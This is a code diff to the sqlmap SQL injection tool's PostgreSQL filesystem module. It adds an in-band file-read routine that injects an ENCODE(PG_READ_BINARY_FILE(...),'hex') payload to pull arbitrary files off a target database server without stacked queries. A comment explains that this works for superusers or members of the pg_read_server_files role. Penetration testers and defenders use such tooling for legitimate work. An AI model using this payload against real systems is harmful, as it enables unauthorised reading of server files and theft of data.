@@ -11,6 +11,7 @@ from lib.core.common import randomInt
 from lib.core.compat import xrange
 from lib.core.data import kb
 from lib.core.data import logger
+from lib.core.enums import CHARSET_TYPE
 from lib.core.exception import SqlmapUnsupportedFeatureException
 from lib.core.settings import LOBLKSIZE
 from lib.request import inject
@@ -31,6 +32,15 @@ class Filesystem(GenericFilesystem):
         self.initEnv()
 
         return self.udfEvalCmd(cmd=remoteFile, udfName="sys_fileread")
+
+    def nonStackedReadFile(self, remoteFile):
+        if not kb.bruteMode:
+            infoMsg = "fetching file: '%s'" % remoteFile
+            logger.info(infoMsg)
+
+        # a superuser (or a member of the pg_read_server_files role on PostgreSQL >= 11) can read
+        # files in-band via pg_read_binary_file(), so file reading does not require stacked queries
+        return inject.getValue("ENCODE(PG_READ_BINARY_FILE('%s'),'hex')" % remoteFile, charsetType=CHARSET_TYPE.HEXADECIMAL)
 
     def unionWriteFile(self, localFile, remoteFile, fileType=None, forceCheck=False):
         errMsg = "PostgreSQL does not support file upload with UNION "
